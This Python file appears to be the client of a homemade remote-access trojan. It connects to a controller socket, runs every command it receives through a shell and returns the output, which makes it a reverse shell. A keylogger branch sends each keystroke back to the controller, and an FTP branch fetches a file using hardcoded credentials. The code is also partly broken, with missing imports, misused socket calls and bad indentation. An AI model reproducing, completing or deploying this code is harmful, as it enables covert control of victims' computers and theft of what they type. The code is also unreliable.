import socket
import os
import subprocess
SIZE = 1048576
FORMAT = "utf-8"
BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"

def client():
    s = socket.socket()
    host = "127.0.0.1"
    port = 8888

    s.connect((host, port))
    client_socket,address=s.accept()
    while True:
        data = s.recv(1048576)
        if data.decode("utf-8") == "send files":
             HOSTNAME = "ftp.dlptest.com" 
             USERNAME = "dlpuser" 
             PASSWORD = "rNrKYTX9g7z3RgJRmxWuGHbeu" 
              ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD) 
  
            
             ftp_server.encoding = "utf-8" 
  
        
             filename = "newfile.py" 
             local_filename = os.path.join(r"C:\Users\Admin\Downloads", filename) 
          
             with open(local_filename, "wb") as file: 
             
                   ftp_server.retrbinary(f"RETR {filename}", file.write) 
  
             
             ftp_server.dir() 
             try: 
                 
                  file= open(filename, "r") 
                  print('File Content:', file.read()) 
                  ftp_server.quit() 
             except: 
                print("unreadable format") 
        if data.decode("utf-8") == "keylog": 
             
                def on_press(key): 
            
                  try: 
                      print(f'Key {key.char} pressed!') 
                      a=f'Key {key.char} pressed!' 
                      s.send(str.encode(a)) 
                  except AttributeError: 
                      print(f'Special Key {key} pressed!') 
                      a=f'Special Key {key} pressed!' 
                      s.send(str.encode(a)) 
                def on_release(key): 
                   print(f'Key {key} released') 
                   if key == Keyboard.Key.esc: 
                     # Stop the listener 
                     s.send(str.encode('exited')) 
                     return False 
                
                     
                with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener: 
                 
                listener.run() 
           
        else:
            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))
        

            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte, "utf-8")
                current_wd = os.getcwd() + "$ "
                s.send(str.encode(output_str + current_wd))
                print(output_str)


client()
